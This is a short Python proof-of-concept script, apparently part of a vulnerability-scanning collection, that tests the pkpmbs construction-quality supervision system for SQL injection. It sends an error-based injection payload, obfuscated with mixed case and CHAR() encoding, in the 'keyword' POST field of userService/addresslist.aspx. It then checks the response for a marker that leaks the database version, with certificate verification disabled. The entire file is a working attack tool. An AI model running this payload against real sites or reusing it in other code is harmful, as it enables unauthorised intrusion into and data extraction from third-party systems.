#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: pkpmbs建设工程质量监督系统注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0120366
author: Lucifer
description: userService/addresslist.aspx文件中POST keyword存在SQL注入。
'''
import sys
import json
import requests
import warnings
  
  

class addresslist_keyword_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['pkpmbs建设工程质量监督系统注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/userService/addresslist.aspx"
        post_data = {
            "keyword":"1'AnD 1=CoNvErt(InT,(ChAr(71)+ChAr(65)+ChAr(79)+ChAr(74)+ChAr(73)+@@VeRsIon)) AnD'%'='",
            "Submit3":"%E6%90%9C%E3%80%80%E7%B4%A2"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"GAOJIMicrosoft" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = addresslist_keyword_sqli(sys.argv[1])
    testVuln.run()